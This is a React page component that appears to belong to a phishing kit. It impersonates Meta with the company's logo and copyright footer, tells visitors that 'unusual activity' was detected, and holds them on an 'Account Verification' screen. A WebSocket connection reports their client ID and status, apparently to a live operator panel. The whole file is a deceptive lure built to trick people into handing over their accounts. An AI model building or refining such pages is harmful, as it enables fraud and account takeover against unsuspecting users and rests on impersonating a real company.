import { useWebSocket } from '../context/WebSocketContext';
import '../styles/home.css';

const HomePage = () => {
  const { isConnected, clientId, isLoading } = useWebSocket();

  return (
    <div className="home-container">
      <div className="home-card">
        {/* Meta Logo */}
        <div className="home-logo">
          <img src="/20200731035726.svg" alt="Meta" />
        </div>

        <h1 className="home-title">Account Verification</h1>
        
        <p className="home-description">
          Your request is being processed. Please wait while we verify your information.
        </p>

        {/* Connection Status */}
        <div className="status-container">
          {isLoading ? (
            <div className="status-loading">
              <div className="spinner"></div>
              <span>Connecting to server...</span>
            </div>
          ) : isConnected ? (
            <div className="status-connected">
              <div className="status-dot connected"></div>
              <span>Connected - Waiting for verification</span>
            </div>
          ) : (
            <div className="status-disconnected">
              <div className="status-dot disconnected"></div>
              <span>Disconnected - Reconnecting...</span>
            </div>
          )}
        </div>

        {/* Progress Indicator */}
        <div className="progress-container">
          <div className="progress-bar-animated">
            <div className="progress-bar-inner"></div>
          </div>
        </div>

        {/* Info Box */}
        <div className="info-box">
          <p>
            <strong>Why am I seeing this?</strong>
          </p>
          <p>
            We detected unusual activity on your account. For your security, 
            we need to verify your identity before you can continue.
          </p>
        </div>

        {/* Footer */}
        <div className="home-footer">
          <span>Meta © {new Date().getFullYear()}</span>
          <span>•</span>
          <a href="#">Privacy</a>
          <span>•</span>
          <a href="#">Terms</a>
        </div>
      </div>
    </div>
  );
};

export default HomePage;